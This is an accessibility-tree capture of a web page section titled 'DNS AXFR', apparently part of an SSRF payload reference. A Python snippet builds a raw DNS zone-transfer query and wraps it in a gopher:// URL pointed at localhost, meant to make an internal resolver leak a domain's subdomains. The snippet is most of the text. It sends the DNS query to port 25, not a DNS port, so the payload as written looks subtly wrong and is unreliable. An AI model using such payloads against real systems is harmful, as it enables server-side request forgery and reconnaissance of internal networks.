        - heading "DNS AXFR" [level=2] [ref=f6e1541]
        - paragraph [ref=f6e1542]:
          - generic [ref=f6e1543]: Q
          - text: uery an internal DNS resolver to trigger a full zone transfer (
          - strong [ref=f6e1544]: AXFR
          - text: ) and exfiltrate a list of subdomains.
        - figure "py Copy" [ref=f6e1545]:
          - generic [ref=f6e1546]:
            - generic [ref=f6e1547]: py
            - button "Copy" [ref=f6e1548] [cursor=pointer]
          - code [ref=f6e1553]:
            - generic [ref=f6e1554]: from urllib.parse import quote
            - generic [ref=f6e1555]: domain,tld = "example.lab".split('.')
            - generic [ref=f6e1556]: "dns_request = b\"\\x01\\x03\\x03\\x07\" # BITMAP"
            - generic [ref=f6e1557]: "dns_request += b\"\\x00\\x01\" # QCOUNT"
            - generic [ref=f6e1558]: "dns_request += b\"\\x00\\x00\" # ANCOUNT"
            - generic [ref=f6e1559]: "dns_request += b\"\\x00\\x00\" # NSCOUNT"
            - generic [ref=f6e1560]: "dns_request += b\"\\x00\\x00\" # ARCOUNT"
            - generic [ref=f6e1561]: "dns_request += len(domain).to_bytes() # LEN DOMAIN"
            - generic [ref=f6e1562]: "dns_request += domain.encode() # DOMAIN"
            - generic [ref=f6e1563]: "dns_request += len(tld).to_bytes() # LEN TLD"
            - generic [ref=f6e1564]: "dns_request += tld.encode() # TLD"
            - generic [ref=f6e1565]: "dns_request += b\"\\x00\" # DNAME EOF"
            - generic [ref=f6e1566]: "dns_request += b\"\\x00\\xFC\" # QTYPE AXFR (252)"
            - generic [ref=f6e1567]: "dns_request += b\"\\x00\\x01\" # QCLASS IN (1)"
            - generic [ref=f6e1568]: dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request
            - generic [ref=f6e1569]: "print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')"
